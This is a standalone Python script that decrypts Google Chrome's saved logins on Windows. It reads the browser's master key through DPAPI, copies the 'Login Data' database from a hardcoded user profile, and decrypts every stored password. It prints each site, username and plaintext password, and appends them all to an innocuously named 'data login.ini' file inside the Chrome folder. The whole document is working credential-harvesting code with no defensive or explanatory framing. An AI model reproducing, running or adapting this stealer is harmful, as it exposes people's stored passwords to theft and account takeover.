import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main():
    key = get_encryption_key()
    db_path = r"C:\Users\RAD_Mehran\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data"
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            with open(file=f'{os.environ["USERPROFILE"]}\\AppData\\Local\\Google\\Chrome\\data login.ini', mode="a", encoding="utf-8") as f:
                f.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}" + f"\n{'=' * 50}\n")
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            with open(file=f'{os.environ["USERPROFILE"]}\\AppData\\Local\\Google\\Chrome\\data login.ini', mode="a", encoding="utf-8") as f:
                f.write(f"\nCreation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            with open(file=f'{os.environ["USERPROFILE"]}\\AppData\\Local\\Google\\Chrome\\data login.ini', mode="a", encoding="utf-8") as f:
                f.write(f"\nLast Used: {str(get_chrome_datetime(date_last_used))}\n")
        with open(file=f'{os.environ["USERPROFILE"]}\\AppData\\Local\\Google\\Chrome\\data login.ini', mode="a", encoding="utf-8") as f:
            f.write("=" * 50 + "\n")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
if __name__ == "__main__":
    main()